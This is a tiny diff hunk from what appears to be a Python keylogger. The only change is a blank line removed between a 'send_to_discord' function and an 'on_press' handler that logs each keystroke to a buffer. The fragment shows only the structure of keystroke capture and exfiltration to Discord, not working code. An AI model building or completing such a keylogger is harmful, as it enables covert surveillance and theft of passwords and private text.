@@ -42,7 +42,6 @@ def send_to_discord():
             print(f"Error sending to Discord: {e}")
         time.sleep(1)
 
-
 def on_press(key):
     """Log each keystroke and add it to the buffer."""
     try:
